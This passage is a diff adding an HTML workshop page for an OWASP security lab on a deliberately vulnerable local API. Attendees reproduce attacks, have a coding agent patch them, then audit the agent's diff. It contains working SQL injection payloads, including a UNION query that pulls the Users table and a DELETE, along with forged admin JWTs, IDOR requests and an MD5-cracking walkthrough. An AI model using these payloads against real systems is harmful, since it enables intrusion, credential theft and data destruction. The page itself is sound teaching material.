+      <div class="code"><span class="label">forged admin · no login</span><button class="copy">Copy</button><pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjEiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiaGFja2VyIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiYWRtaW4ifQ.mH6v2tBXUqWFW3M2g5s3uSW1kG83L_MhrU4wokfDo-M</pre></div>
+      <div class="code"><span class="label">expired · 2020 (A07)</span><button class="copy">Copy</button><pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjIiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWxpY2UiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJjdXN0b21lciIsImV4cCI6MTU3NzgzNjgwMH0.b2gWZCl3BQ4Mu1WQUWkmrYTPRLkVPAs-v2vdKpnhjkA</pre></div>
+      <div class="code"><span class="label">foreign issuer · hr-system (A07)</span><button class="copy">Copy</button><pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjEiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWRtaW4iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJhZG1pbiIsImlzcyI6ImhyLXN5c3RlbSIsImF1ZCI6ImludGVybmFsLXRvb2xzIn0.o_YtXQgzNpX1VyBvPP3RaaEmRcSw0f1cDP1OeZd0GqU</pre></div>
+    </div></details>
+    <div class="task" data-id="tok-1"><input type="checkbox"><div class="body"><div class="title">Have alice, bob and admin tokens ready</div><div class="desc">Either paste the fresh logins into the <code>.http</code> variables, or grab the pre-made tokens above. Refresh them after the A02/A07 fixes.</div></div></div>
+  </section>
+
+
+  <!-- ============ GROUPS ============ -->
+  <section id="groups">
+    <div class="sec-head"><h2>Part 1 · Your group</h2><span class="time-hint">set up at 0:00–0:10</span></div>
+    <p class="sec-sub">Part 1 runs in groups. Each group owns one or two OWASP categories, fixes them with its coding agent, proves the fix, and presents it to the room.</p>
+
+    <table>
+      <thead><tr><th>Time</th><th>Block</th><th>Who</th></tr></thead>
+      <tbody>
+        <tr><td><code>0:00</code></td><td>Setup — one working machine per group, groups formed</td><td>everyone</td></tr>
+        <tr><td><code>0:10</code></td><td><b>See</b> — live demo of A01 and A03</td><td>presenter</td></tr>
+        <tr><td><code>0:20</code></td><td><b>Scan</b> together — then groups get their categories</td><td>everyone</td></tr>
+        <tr><td><code>0:25</code></td><td><b>Fix → Prove → Audit</b> your categories</td><td>your group</td></tr>
+        <tr><td><code>0:55</code></td><td>10-minute call — stop fixing, build your presentation</td><td>your group</td></tr>
+        <tr><td><code>1:05</code></td><td><b>Present</b> — about 4 minutes per group</td><td>your group</td></tr>
+        <tr><td><code>1:30</code></td><td>Checkpoint, break, then Part 2</td><td>everyone</td></tr>
+      </tbody>
+    </table>
+
+    <h3 class="q">Pick your group</h3>
+    <p class="muted" style="font-size:13.5px">Your presenter tells you how many groups the room has and which one you're in. Picking it here highlights your categories, gives you your own scan command, and only counts your tasks in the progress bar.</p>
+    <div class="picker" id="layoutPicker"><span class="lbl">Groups in room</span><button data-layout="3">3</button><button data-layout="4">4</button><button data-layout="6">6</button></div>
+    <div class="picker" id="groupPicker"><span class="lbl">My group</span></div>
+    <div class="mine-box" id="mineBox"><span class="none">No group picked yet.</span></div>
+
+    <table id="assignTable">
+      <thead><tr><th>Group</th><th>Categories</th></tr></thead>
+      <tbody></tbody>
+    </table>
+
+    <h3 class="q">How your group works</h3>
+    <div class="callout why"><div class="h">💻 One machine, one repo</div>Your group's fix is <b>one diff on one laptop</b> — that's what you present. Everyone else can still run the attacks on their own machine. Start from a clean <code>main</code>.</div>
+    <table>
+      <thead><tr><th>Role</th><th>Job</th></tr></thead>
+      <tbody>
+        <tr><td><b>Driver</b></td><td>Owns the repo, runs the agent, commits before the agent touches anything.</td></tr>
+        <tr><td><b>Attacker</b></td><td>Runs your <code>.http</code> attacks — before the fix (to see it) and after (to prove it).</td></tr>
+        <tr><td><b>Auditor</b></td><td>Reads the diff against the six questions and your category's checklist.</td></tr>
+        <tr><td><b>Presenter</b></td><td>Builds the 4-minute story while the others work.</td></tr>
+      </tbody>
+    </table>
+    <p class="muted" style="font-size:13px">Three people? One of you takes two roles.</p>
+    <div class="task" data-id="grp-1"><input type="checkbox"><div class="body"><div class="title">Group formed, roles picked, one machine running the API</div></div></div>
+  </section>
+
+  <!-- ============ SCAN TOGETHER ============ -->
+  <section id="scan">
+    <div class="sec-head"><h2>1 · Scan — together</h2><span class="time-hint">0:20 · ~5 min</span></div>
+    <p class="sec-sub">You've seen two flaws live. Now everyone runs the full scan once — the findings are the agent's to-do list.</p>
+    <div class="code"><span class="label">bash · custom rules</span><button class="copy">Copy</button><pre>semgrep --config semgrep-rules/ Aviato.API/ Aviato.Infrastructure/</pre></div>
+    <div class="code"><span class="label">bash · + community C# rules, JSON out</span><button class="copy">Copy</button><pre>semgrep --config semgrep-rules/ --config "p/csharp" \
+  Aviato.API/ Aviato.Infrastructure/ \
+  --json --output semgrep-results.json</pre></div>
+    <p class="muted">Expect <b>16 findings</b> from the custom rules across A01, A02, A03, A05, A07 and A09. Adding <code>--config "p/csharp"</code> pulls in community rules too. Note the one thing Semgrep <b>can't</b> find: the IDOR you just saw (A01). A scanner can't know order&nbsp;1 belongs to Alice — that's business logic, not a pattern.</p>
+    <div class="task" data-id="scan-done"><input type="checkbox"><div class="body"><div class="title">Ran the full scan — saw the 16 findings</div></div></div>
+  </section>
+
+  <!-- ============ GROUP WORK ============ -->
+  <section id="groupwork">
+    <div class="sec-head"><h2>2 · Fix &rarr; Prove &rarr; Audit</h2><span class="owasp">YOUR GROUP</span><span class="time-hint">0:25–1:05 · 40 min</span></div>
+    <p class="sec-sub">Run this loop on <i>your</i> categories only. Your category brief (below) has the attacks and the checklist.</p>
+
+    <h3 class="q">① Reproduce</h3>
+    <p>The attacker runs your category's attacks from its brief or <code>.http</code> file and writes down the status codes. That's the &ldquo;before&rdquo; in your presentation.</p>
+
+    <h3 class="q">② Commit</h3>
+    <div class="callout warn"><div class="h">⚠ Commit before the agent edits anything</div>You need a clean diff to read — and to put on screen in your presentation.</div>
+
+    <h3 class="q">③ Scan your categories</h3>
+    <p>Only your rule files, so the agent only sees your findings:</p>
+    <div class="code"><span class="label">bash · your scan</span><button class="copy">Copy</button><pre id="myScan">semgrep --config semgrep-rules/&lt;your rule files&gt;.yml \
+  Aviato.API/ Aviato.Infrastructure/</pre></div>
+    <p class="muted" style="font-size:13px" id="myScanNote">Pick your group above and this command fills itself in.</p>
+
+    <h3 class="q">④ Fix — hand it to your agent</h3>
+    <div class="code"><span class="label">prompt</span><button class="copy">Copy</button><pre>Here are the Semgrep findings for my part of this repo.
+Fix only these, and don't change anything unrelated.
+Explain what you changed and why.</pre></div>
+    <p class="muted" style="font-size:13px">Group with A01: the scan can't see the IDOR — add it to the prompt yourselves.</p>
+    <div class="task" data-id="fix-done"><input type="checkbox"><div class="body"><div class="title">Agent patched our findings</div></div></div>
+
+    <h3 class="q">⑤ Prove it</h3>
+    <p>Restart the API, re-run the <i>same</i> attacks — they must fail now, and for the right reason — then re-run your scan. A scan that went green is not proof on its own.</p>
+    <div class="task" data-id="prove-done"><input type="checkbox"><div class="body"><div class="title">Re-ran our attacks and our scan after the fix</div><div class="desc">Note the status codes — that's the &ldquo;after&rdquo; in your presentation.</div></div></div>
+
+    <h3 class="q">⑥ Audit — read the diff</h3>
+    <p>The agent fixed most of it, faster than you could. That's not the point. The point is that <i>most</i> isn't <i>all</i>, and only the diff tells you which. Run every fix through six questions, then your brief's <b>🔍 Audit the agent's fix</b> checklist:</p>
+    <table>
+      <thead><tr><th>#</th><th>Ask</th><th>Why</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>Root cause or symptom?</td><td>Parameterised the query, or just stripped quotes?</td></tr>
+        <tr><td>2</td><td>Prove it — re-run the original attack.</td><td>The <code>.http</code> files are now your regression tests.</td></tr>
+        <tr><td>3</td><td>Re-run Semgrep — gone or silenced?</td><td>Fixed, or reshaped until the rule stopped matching?</td></tr>
+        <tr><td>4</td><td>What <i>else</i> changed?</td><td>Read the whole diff, not the agent's summary of it.</td></tr>
+        <tr><td>5</td><td>What broke?</td><td>Can you still log in? Does search still work?</td></tr>
+        <tr><td>6</td><td>What new risk did it add?</td><td>Timing, new errors, a loosened default. The interesting answers live here.</td></tr>
+      </tbody>
+    </table>
+    <div class="callout danger"><div class="h">🪤 Meta-traps</div>A <code>// nosemgrep</code> comment or a rule-dodging rename (scan goes green, nothing fixed) &middot; fixed the flagged line, left the twin in a sibling method &middot; unrelated files in the diff &middot; a test quietly weakened to make the build pass.</div>
+    <div class="task audit" data-id="audit-done"><input type="checkbox"><div class="body"><div class="title">Audited our diff against the six questions and our checklist</div></div></div>
+
+    <div class="callout why"><div class="h">⏩ Done early?</div>Take the categories of the <b>group after yours</b> (the last group takes group&nbsp;1's), run the same loop, and add a 30-second comparison to that group's presentation: &ldquo;our agent did it like this instead.&rdquo;</div>
+    <div class="callout warn"><div class="h">⏱ 0:55 — the 10-minute call</div>Stop fixing and build your presentation. A half-fixed category with an honest &ldquo;and here's what's still broken&rdquo; is a good presentation.</div>
+  </section>
+
+  <!-- ============ A01 ============ -->
+  <section id="a01" class="brief" data-cat="a01">
+    <div class="sec-head"><h2>Broken Access Control</h2><span class="owasp">A01</span><span class="mode grp" data-grp-for="a01"></span><span class="mode demo">▶ live demo</span><span class="time-hint">brief</span></div>
+    <p class="sec-sub">File: <code>Aviato.API/http/01_A01_broken_access_control.http</code></p>
+    <div class="callout warn"><div class="h">🧭 Six briefs — work on yours</div>These are the category briefs: the attacks, why they work, and the audit checklist for the agent's fix. Work through <b>your group's</b>; read the others if you're curious — you'll hear about them in the presentations. <b>A01</b> and <b>A03</b> are also demoed live (<span class="mode demo">▶ live demo</span>).</div>
+    <p>Two independent flaws: an <b>IDOR</b> (one user reads another user's order) and a completely <b>unauthenticated admin endpoint</b>.</p>
+
+    <h3 class="q">(a) IDOR — Bob reads Alice's order</h3>
+    <p>Alice and Bob each create an order. Bob then requests order <code>#1</code> (Alice's) with <i>his own</i> token. Running this from the page means switching identity in the top bar between the two requests — log in as <b>alice</b> for the setup, then as <b>bob</b> for the attack.</p>
+    <div class="code"><span class="label">http · setup</span><button class="copy">Copy</button><pre><span class="tok-c"># Alice places an order — note the id in the response</span>
+<span class="tok-m">POST</span> <span class="tok-u">http://localhost:5218/orders</span>
+Authorization: Bearer {{aliceToken}}
+Content-Type: application/json
+
+{ <span class="tok-s">"items"</span>: [ { <span class="tok-s">"productId"</span>: 1, <span class="tok-s">"quantity"</span>: 1 } ] }</pre></div>
+    <div class="code"><span class="label">http</span><button class="copy">Copy</button><pre><span class="tok-c"># Bob is logged in, but asks for Alice's order #1</span>
+<span class="tok-m">GET</span> <span class="tok-u">http://localhost:5218/orders/1</span>
+Authorization: Bearer {{bobToken}}</pre></div>
+    <table>
+      <thead><tr><th>Expected (secure)</th><th>Actual</th></tr></thead>
+      <tbody><tr><td class="b-ok">403 Forbidden</td><td class="b-bad">200 OK — Bob sees Alice's order ✓ vulnerability</td></tr></tbody>
+    </table>
+
+    <h3 class="q">(b) Admin endpoint with no auth at all</h3>
+    <div class="code"><span class="label">http</span><button class="copy">Copy</button><pre><span class="tok-c"># No token whatsoever</span>
+<span class="tok-m">GET</span> <span class="tok-u">http://localhost:5218/admin/users</span></pre></div>
+    <table>
+      <thead><tr><th>Expected (secure)</th><th>Actual</th></tr></thead>
+      <tbody><tr><td class="b-ok">401 Unauthorized</td><td class="b-bad">200 OK — every user + password hash returned ✓</td></tr></tbody>
+    </table>
+
+    <div class="callout why"><div class="h">💡 Why it happens</div><code>GET /orders/{id}</code> never compares <code>order.UserId</code> to the caller, and <code>/admin/users</code> is missing <code>.RequireAuthorization()</code>.</div>
+
+    <div class="task" data-id="a01-done"><input type="checkbox"><div class="body"><div class="title">Reproduced both A01 flaws (IDOR + open admin endpoint)</div></div></div>
+
+    <h3 class="q">Audit the agent's fix</h3>
+    <p class="muted">When your agent patches these, read the diff — don't trust its summary:</p>
+    <div class="task audit" data-id="a01-audit1"><input type="checkbox"><div class="body"><div class="title">Ownership, not just a login check</div><div class="desc">Re-run Bob → <code>GET /orders/1</code>: must be <b>403</b>. Then alice's token → <code>/admin/users</code>: must be <b>403</b> too. Agents reliably add <code>.RequireAuthorization()</code> and forget <code>RequireRole("admin")</code> — so every logged-in customer can still read the hashes.</div></div></div>
+    <div class="task audit" data-id="a01-audit2"><input type="checkbox"><div class="body"><div class="title">Same bug, other routes</div><div class="desc">It fixed the line Semgrep flagged. Did it fix the identical pattern on every other <code>/{id}</code> route, or just that one?</div></div></div>
+    <div class="callout why"><div class="h">🌍 Where else does this hide?</div>Any route that takes an object id from the URL and trusts it: <code>/invoices/{id}</code>, password-reset links, profile pages, downloadable receipts, S3 object keys, GraphQL <code>node(id)</code>. IDOR tops the API Top-10 precisely because the id is right there and the ownership check is one easy line to forget.</div>
+  </section>
+
+  <!-- ============ A02 ============ -->
+  <section id="a02" class="brief" data-cat="a02">
+    <div class="sec-head"><h2>Cryptographic Failures</h2><span class="owasp">A02</span><span class="mode grp" data-grp-for="a02"></span><span class="time-hint">brief</span></div>
+    <p class="sec-sub">File: <code>Aviato.API/http/02_A02_cryptographic_failures.http</code></p>
+    <p>Passwords are hashed with bare <b>MD5</b> (fast, unsalted) and the <b>JWT secret is hardcoded</b> — so anyone who knows it can mint their own admin token.</p>
+
+    <h3 class="q">(a) Crack an MD5 password hash</h3>
+    <ol>
+      <li>Register a user with password <code>hunter2</code>.</li>
+      <li>Call <code>GET /admin/users</code> and find the hash <code>2ab96390c7dbe3439de74d0c9b0b1767</code>.</li>
+      <li>Paste it into <a href="https://crackstation.net" target="_blank" rel="noopener">crackstation.net</a> — instant hit, because unsalted MD5 lives in every rainbow table.</li>
+    </ol>
+    <div class="code"><span class="label">http</span><button class="copy">Copy</button><pre><span class="tok-c"># Register a user — the password is hunter2</span>
+<span class="tok-m">POST</span> <span class="tok-u">http://localhost:5218/auth/register</span>
+Content-Type: application/json
+
+{
+  <span class="tok-s">"username"</span>: <span class="tok-s">"victim"</span>,
+  <span class="tok-s">"email"</span>: <span class="tok-s">"victim@example.com"</span>,
+  <span class="tok-s">"password"</span>: <span class="tok-s">"hunter2"</span>
+}</pre></div>
+    <div class="code"><span class="label">http</span><button class="copy">Copy</button><pre><span class="tok-c"># Hash for hunter2: 2ab96390c7dbe3439de74d0c9b0b1767</span>
+<span class="tok-m">GET</span> <span class="tok-u">http://localhost:5218/admin/users</span></pre></div>
+    <div class="callout warn"><div class="h">⚠ Order matters</div>If you've already fixed <b>A01</b>, <code>/admin/users</code> now needs an <b>admin</b> token. Log in as <code>admin</code> in the top bar and run the request below — otherwise you'll get 401 instead of the hash. (This is audit question 5 in action: a fix in one place breaks an exploit elsewhere.)</div>
+    <div class="code"><span class="label">http · if A01 is already fixed</span><button class="copy">Copy</button><pre><span class="tok-c"># Same call, with the logged-in admin token</span>
+<span class="tok-m">GET</span> <span class="tok-u">http://localhost:5218/admin/users</span>
+Authorization: Bearer {{adminToken}}</pre></div>
+
+    <h3 class="q">(b) Forge an admin token — no login needed</h3>
+    <p>The secret <code>aviato-jwt-signing-key-2024-prod!</code> sits in <code>appsettings.json</code>. With it you can HMAC-sign your own token on <a href="https://jwt.io" target="_blank" rel="noopener">jwt.io</a> claiming <code>role: admin</code>. The API accepts it. The request below sends that token to <code>GET /orders/my</code> — the same call as the <code>.http</code> file, with no login.</p>
+    <div class="code"><span class="label">http · forged admin</span><button class="copy">Copy</button><pre><span class="tok-c"># Self-signed with the hardcoded secret — no login</span>
+<span class="tok-m">GET</span> <span class="tok-u">http://localhost:5218/orders/my</span>
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjEiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiaGFja2VyIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiYWRtaW4ifQ.mH6v2tBXUqWFW3M2g5s3uSW1kG83L_MhrU4wokfDo-M</pre></div>
+    <div class="callout danger"><div class="h">🔥 Impact</div>Hardcoded secret + role claim = full admin impersonation with zero credentials. The secret in source control is the single point of failure.</div>
+    <div class="callout warn"><div class="h">⚠ After the secret is removed</div>Once the agent takes the secret out of <code>appsettings.json</code>, the API will not start until you provide one. Set it locally (it never enters git):
+      <div class="code" style="margin:10px 0 4px"><span class="label">bash</span><button class="copy">Copy</button><pre>dotnet user-secrets set "Jwt:Secret" "$(openssl rand -base64 48)" --project Aviato.API</pre></div>
+      or use the environment variable <code>Jwt__Secret</code>. This also invalidates every pre-made token — a fresh login is the proof the fix works.</div>
+
+    <div class="task" data-id="a02-done"><input type="checkbox"><div class="body"><div class="title">Cracked the MD5 hash &amp; understood the forged-token risk</div></div></div>
+
+    <h3 class="q">Audit the agent's fix</h3>
+    <p class="muted">This is the richest fix to audit — check all three:</p>
+    <div class="task audit" data-id="a02-audit1"><input type="checkbox"><div class="body"><div class="title">The timing trap (the headline)</div><div class="desc">Swapping MD5→BCrypt makes login slow <i>only for real users</i>. Time a login for a real vs an unknown username — if they differ, the fix just created an account-enumeration side channel. This is the moment the whole lab is built around — if you find it, it's the centre of your presentation.</div></div></div>
+    <div class="code"><span class="label">bash · median login time, real vs unknown user</span><button class="copy">Copy</button><pre>for u in alice nosuchuser; do
+  for i in $(seq 15); do
+    curl -s -o /dev/null -w "%{time_total}\n" -X POST http://localhost:5218/auth/login \
+      -H "Content-Type: application/json" -d "{\"username\":\"$u\",\"password\":\"wrong\"}"
+  done | sort -n | sed -n 8p | xargs echo "$u median:"
+done</pre></div>
+    <div class="task audit" data-id="a02-audit2"><input type="checkbox"><div class="body"><div class="title">The fallback default</div><div class="desc">Search the diff for <code>?? "aviato-jwt-signing-key-2024-prod!"</code>. Agents love a fallback — and the fallback <i>is</i> the vulnerability, put back.</div></div></div>
+    <div class="task audit" data-id="a02-audit3"><input type="checkbox"><div class="body"><div class="title">Did it lock everyone out?</div><div class="desc">If it didn't migrate the existing seeded hashes, every pre-existing account can no longer log in. It only <i>looks</i> fine because the DB re-seeds on restart.</div></div></div>
+    <div class="callout why"><div class="h">🌍 Where else does this hide?</div>Any <code>MD5</code>/<code>SHA1</code> used for passwords or signatures; secrets committed in <code>appsettings.json</code>, <code>.env</code>, or CI variables; API keys baked into mobile/JS bundles; TLS downgraded to old ciphers. The pattern is "a secret that isn't actually secret, or a hash that's too fast."</div>
+  </section>
+
+  <!-- ============ A03 ============ -->
+  <section id="a03" class="brief" data-cat="a03">
+    <div class="sec-head"><h2>SQL Injection</h2><span class="owasp">A03</span><span class="mode grp" data-grp-for="a03"></span><span class="mode demo">▶ live demo</span><span class="time-hint">brief</span></div>
+    <p class="sec-sub">File: <code>Aviato.API/http/03_A03_sql_injection.http</code></p>
+    <p>The product search builds raw SQL by string interpolation:<br><code>SELECT * FROM Products WHERE Name LIKE '%{q}%'</code>. Three escalating payloads:</p>
+
+    <div class="code"><span class="label">http · reference</span><button class="copy">Copy</button><pre><span class="tok-m">GET</span> <span class="tok-u">http://localhost:5218/products/search?q=laptop</span></pre></div>
+
+    <table>
+      <thead><tr><th>#</th><th>Payload (<code>?q=</code>)</th><th>Effect</th></tr></thead>
+      <tbody>
+        <tr><td>a</td><td><code>' OR '1'='1</code><button class="run-inline" data-search="' OR '1'='1">Run</button></td><td>Boolean bypass → <b>all products</b> returned</td></tr>
+        <tr><td>b</td><td><code>x' UNION SELECT Id,Username,Email,0,0,PasswordHash FROM Users--</code><button class="run-inline" data-search="x' UNION SELECT Id,Username,Email,0,0,PasswordHash FROM Users--">Run</button></td><td class="b-bad">Exfiltrates the <b>Users table</b> (names + hashes)</td></tr>
+        <tr><td>c</td><td><code>x'; DELETE FROM Products;--</code><button class="run-inline danger" data-search="x'; DELETE FROM Products;--" data-danger="1">Run</button></td><td class="b-bad">⚠ <b>Deletes all products</b> (use Reset application after)</td></tr>
+      </tbody>
+    </table>
+    <div class="out-panel"><div class="resp" id="a03out" hidden></div></div>
+    <div class="callout warn"><div class="h">⚠ Destructive step</div>Payload (c) really empties the table. After running it, <code>GET /products</code> returns <code>[]</code>. Use <b>Reset application</b> in the sidebar to restart the API and restore the seed.</div>
+
+    <div class="callout why"><div class="h">💡 Why it happens</div><code>ProductService.cs</code> uses <code>FromSqlRaw($"... {query} ...")</code>. The user string becomes part of the SQL text.</div>
+
+    <div class="task" data-id="a03-done"><input type="checkbox"><div class="body"><div class="title">Ran all three injections (bypass, UNION exfil, DELETE)</div><div class="desc">Use <b>Reset application</b> afterwards so the seed data is back.</div></div></div>
+
+    <h3 class="q">Audit the agent's fix</h3>
+    <p class="muted">The payloads will fail after almost any change. That doesn't mean it's fixed:</p>
+    <div class="task audit" data-id="a03-audit1"><input type="checkbox"><div class="body"><div class="title">Parameters, not sanitisation</div><div class="desc">Did it use a query parameter / <code>EF.Functions.Like</code>, or just strip quotes and block the word <code>DELETE</code>? Only parameterisation is a real fix — the rest is one encoding trick from working again.</div></div></div>
+    <div class="task audit" data-id="a03-audit2"><input type="checkbox"><div class="body"><div class="title">Regression check</div><div class="desc">Can you still search for a product called <code>O'Brien's</code>? Over-aggressive input-stripping breaks legitimate input.</div></div></div>
+    <div class="callout why"><div class="h">🌍 Where else does this hide?</div>Anywhere user input is concatenated into a query string: a <code>LIKE</code> search, an <code>ORDER BY</code> column picked from a dropdown, dynamic filter builders, report exports. The same class shows up as NoSQL injection (Mongo <code>$where</code>), LDAP filters, and OS-command injection — untrusted data changing the <i>structure</i> of a command.</div>
+  </section>
+
+  <!-- ============ A05 ============ -->
+  <section id="a05" class="brief" data-cat="a05">
+    <div class="sec-head"><h2>Security Misconfiguration</h2><span class="owasp">A05</span><span class="mode grp" data-grp-for="a05"></span><span class="time-hint">brief</span></div>
+    <p class="sec-sub">File: <code>Aviato.API/http/04_A05_security_misconfiguration.http</code></p>
+
+    <h3 class="q">(a) Debug endpoint leaks the whole config</h3>
+    <div class="code"><span class="label">http</span><button class="copy">Copy</button><pre><span class="tok-m">GET</span> <span class="tok-u">http://localhost:5218/debug/config</span></pre></div>
+    <p>Returns the JWT secret, <code>ASPNETCORE_ENVIRONMENT</code> and every configuration value in plaintext — no auth, no rate limit. In production this leaks connection strings and API keys.</p>
+    <div class="callout warn"><div class="h">⚠ Those are your environment variables</div>The config includes <b>every environment variable of the shell that started the API</b>. If you have API keys or tokens exported, they are in this response — don't screen-share it.</div>
+
+    <h3 class="q">(b) CORS wildcard</h3>
+    <div class="code"><span class="label">http · preflight from a foreign origin</span><button class="copy">Copy</button><pre><span class="tok-m">OPTIONS</span> <span class="tok-u">http://localhost:5218/products</span>
+Origin: https://evil-attacker.com
+Access-Control-Request-Method: GET</pre></div>
+    <p>Response carries <code>Access-Control-Allow-Origin: *</code> — any website can read the API in a logged-in user's browser context.</p>
+
+    <div class="task" data-id="a05-done"><input type="checkbox"><div class="body"><div class="title">Leaked the config &amp; observed the CORS wildcard</div></div></div>
+
+    <h3 class="q">Audit the agent's fix</h3>
+    <p class="muted">Both of these fixes love to <i>look</i> done:</p>
+    <div class="task audit" data-id="a05-audit1"><input type="checkbox"><div class="body"><div class="title">The Development trap</div><div class="desc">Gating <code>/debug/config</code> behind <code>IsDevelopment()</code> reads as fixed — but the lab <b>runs in Development</b>, so it's still wide open. Re-run <code>GET /debug/config</code>: is it actually a <b>404</b>?</div></div></div>
+    <div class="task audit" data-id="a05-audit2"><input type="checkbox"><div class="body"><div class="title">Wildcard in disguise</div><div class="desc">Check CORS for <code>SetIsOriginAllowed(_ =&gt; true)</code> or <code>WithOrigins("*")</code> — the same wildcard wearing new syntax.</div></div></div>
+    <div class="callout why"><div class="h">🌍 Where else does this hide?</div>Verbose stack-trace error pages in prod, Swagger/actuator/metrics endpoints left public, default admin credentials, an S3 bucket set to public-read, a served <code>.env</code>, directory listing on. Misconfiguration is "the code is fine, the switch was left in the wrong position."</div>
+  </section>
+
+  <!-- ============ A07 ============ -->
+  <section id="a07" class="brief" data-cat="a07">
+    <div class="sec-head"><h2>Identification &amp; Authentication Failures</h2><span class="owasp">A07</span><span class="mode grp" data-grp-for="a07"></span><span class="time-hint">brief</span></div>
+    <p class="sec-sub">File: <code>Aviato.API/http/05_A07_auth_failures.http</code></p>
+    <p>Token validation is switched off in three places (<code>Program.cs</code> → <code>TokenValidationParameters</code>).</p>
+    <table>
+      <thead><tr><th>Test</th><th>Broken setting</th><th>Result</th></tr></thead>
+      <tbody>
+        <tr><td>Token expired in <b>2020</b></td><td><code>ValidateLifetime = false</code></td><td class="b-bad">Still accepted — a stolen token never dies</td></tr>
+        <tr><td>Token issued for <code>hr-system</code></td><td><code>ValidateIssuer/Audience = false</code></td><td class="b-bad">Accepted — token confusion across services</td></tr>
+      </tbody>
+    </table>
+    <div class="callout why"><div class="h">💡 Why it matters</div>Any other service sharing the secret can hand out tokens the Aviato API trusts — one compromised service compromises all of them.</div>
+    <div class="task" data-id="a07-done"><input type="checkbox"><div class="body"><div class="title">Used the expired &amp; foreign-issuer tokens successfully</div><div class="desc">Ready-made tokens are in the <code>.http</code> file and in <a href="#tokens">Step&nbsp;0</a>.</div></div></div>
+
+    <h3 class="q">Audit the agent's fix</h3>
+    <p class="muted">One fix here breaks loudly (fine); the dangerous one is silent:</p>
+    <div class="task audit" data-id="a07-audit1"><input type="checkbox"><div class="body"><div class="title">The quiet miss</div><div class="desc">Did it set <code>ValidateLifetime = true</code> but leave the issued token with <b>no <code>expires</code> claim</b>? Nothing breaks, the scanner's happy, and tokens still never expire. Re-issue one and check for <code>exp</code>.</div></div></div>
+    <div class="task audit" data-id="a07-audit2"><input type="checkbox"><div class="body"><div class="title">Issuer / audience wired end-to-end</div><div class="desc">Turning validation on without setting <code>ValidIssuer</code>/<code>ValidAudience</code> at token creation breaks login. Confirm a fresh login still works <i>and</i> the <code>hr-system</code> token now returns <b>401</b>.</div></div></div>
+    <div class="callout why"><div class="h">🌍 Where else does this hide?</div>Sessions that never expire or aren't revoked on logout/password-change, missing MFA, OAuth <code>redirect_uri</code> not pinned, refresh tokens with no rotation, one shared signing key across microservices. "Who are you, and is this token still supposed to work?" — usually one of those two checks is missing.</div>
+  </section>
+
+  <!-- ============ A09 ============ -->
+  <section id="a09" class="brief" data-cat="a09">
+    <div class="sec-head"><h2>Security Logging &amp; Monitoring Failures</h2><span class="owasp">A09</span><span class="mode grp" data-grp-for="a09"></span><span class="time-hint">brief</span></div>
+    <p class="sec-sub">File: <code>Aviato.API/http/07_A09_sensitive_logging.http</code> — <b>watch the API's terminal</b> while you run these.</p>
+    <p>The app logs secrets in cleartext. Run the requests below and read the API terminal — the password and the card data show up there, not in the response.</p>
+
+    <h3 class="q">(a) Password in the log</h3>
+    <div class="code"><span class="label">http</span><button class="copy">Copy</button><pre><span class="tok-c"># After this, the API terminal prints the password in cleartext</span>
+<span class="tok-m">POST</span> <span class="tok-u">http://localhost:5218/auth/register</span>
+Content-Type: application/json
+
+{
+  <span class="tok-s">"username"</span>: <span class="tok-s">"logvictim"</span>,
+  <span class="tok-s">"email"</span>: <span class="tok-s">"logvictim@example.com"</span>,
+  <span class="tok-s">"password"</span>: <span class="tok-s">"meinGeheimesPasswort123!"</span>
+}</pre></div>
+
+    <h3 class="q">(b) Card data in the log</h3>
+    <p>Log in as <b>alice</b> in the top bar. Create the order first — the payment uses that order's id.</p>
+    <div class="code"><span class="label">http · setup</span><button class="copy">Copy</button><pre><span class="tok-c"># Alice places an order — note the id in the response</span>
+<span class="tok-m">POST</span> <span class="tok-u">http://localhost:5218/orders</span>
+Authorization: Bearer {{aliceToken}}
+Content-Type: application/json
+
+{ <span class="tok-s">"items"</span>: [ { <span class="tok-s">"productId"</span>: 5, <span class="tok-s">"quantity"</span>: 1 } ] }</pre></div>
+    <div class="code"><span class="label">http</span><button class="copy">Copy</button><pre><span class="tok-c"># After this, the API terminal prints the card number and CVV</span>
+<span class="tok-m">POST</span> <span class="tok-u">http://localhost:5218/payments</span>
+Authorization: Bearer {{aliceToken}}
+Content-Type: application/json
+
+{
